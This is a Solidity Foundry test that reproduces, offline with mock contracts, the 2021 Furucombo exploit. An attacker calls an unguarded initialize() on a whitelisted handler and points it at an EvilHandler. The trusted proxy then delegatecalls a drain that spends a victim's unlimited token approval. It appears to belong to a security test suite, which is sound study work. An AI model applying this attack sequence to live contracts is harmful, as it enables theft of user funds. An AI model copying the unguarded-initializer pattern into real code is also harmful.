// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {MockERC20} from "../src/MockERC20.sol";
import {
    FurucomboProxyClone,
    UninitializedHandlerProxy,
    EvilHandler
} from "../fixtures/delegatecall-hijack/b-incident/FurucomboProxyClone.sol";

/// @title delegatecall-hijack tier (b): Furucombo "evil contract" drain (2021-02-27, ~$15M).
/// @notice Minimized offline reproduction of the documented cascading-trust mechanism: the
///         Furucombo proxy executed whitelisted "handlers" by delegatecall. A whitelisted
///         handler (the Aave V2 proxy) had an uninitialized implementation, so the attacker
///         called initialize() to point it at their own code, then had the Furucombo proxy
///         delegatecall it. The attacker's code ran in the proxy's storage/auth context and
///         spent a victim's standing approval to the proxy (transferFrom). Verdict is derived
///         from the real outcome: the approving victim is drained by the attacker. Mechanism-
///         level (the live two-hop proxy resolution is abstracted); see PROVENANCE.md.
contract FurucomboIncidentTest is Test {
    uint256 constant VICTIM_BALANCE = 500_000e18; // representative, scaled
    address constant OWNER = address(0xF0C0); // the Furucombo deployer (registers handlers)
    address constant VICTIM = address(0x1C7); // a user who approved the Furucombo proxy
    address constant ATTACKER = address(0xBAD22);

    function _report(string memory target, bool drained) internal pure {
        string memory verdict = drained ? "VULNERABLE" : "BLOCKED";
        console.log(string.concat("[delegatecall-hijack] target=", target, " verdict=", verdict));
    }

    function test_furucombo_whitelistedHandlerDelegatecall_drainsApproval() public {
        MockERC20 token = new MockERC20();
        FurucomboProxyClone proxy = new FurucomboProxyClone(OWNER);
        UninitializedHandlerProxy aaveHandler = new UninitializedHandlerProxy();
        EvilHandler evil = new EvilHandler();

        // The Furucombo deployer registered the Aave proxy as a trusted handler.
        vm.prank(OWNER);
        proxy.registerHandler(address(aaveHandler));

        // A user holds funds and grants the Furucombo proxy a standing (unlimited) approval,
        // as Furucombo users did to let the proxy move their tokens between protocols.
        token.mint(VICTIM, VICTIM_BALANCE);
        vm.prank(VICTIM);
        token.approve(address(proxy), type(uint256).max);

        // ATTACK: the whitelisted handler's implementation was never initialized, so the
        // attacker sets it to their own EvilHandler (unguarded initializer).
        vm.prank(ATTACKER);
        aaveHandler.initialize(address(evil));

        // The attacker then asks the trusted Furucombo proxy to run that handler. The proxy
        // delegatecalls EvilHandler.drain in its OWN context, so the transferFrom spends the
        // victim's approval to the proxy.
        bytes memory data = abi.encodeWithSignature(
            "drain(address,address,address,uint256)", address(token), VICTIM, ATTACKER, VICTIM_BALANCE
        );
        vm.prank(ATTACKER);
        proxy.exec(address(aaveHandler), data);

        bool drained = (token.balanceOf(VICTIM) == 0 && token.balanceOf(ATTACKER) == VICTIM_BALANCE);
        _report("furucombo-proxy-victim", drained);

        assertTrue(drained, "whitelisted-handler delegatecall should drain the approving victim");
        assertEq(token.balanceOf(ATTACKER), VICTIM_BALANCE, "attacker drained the victim's approval");
    }
}
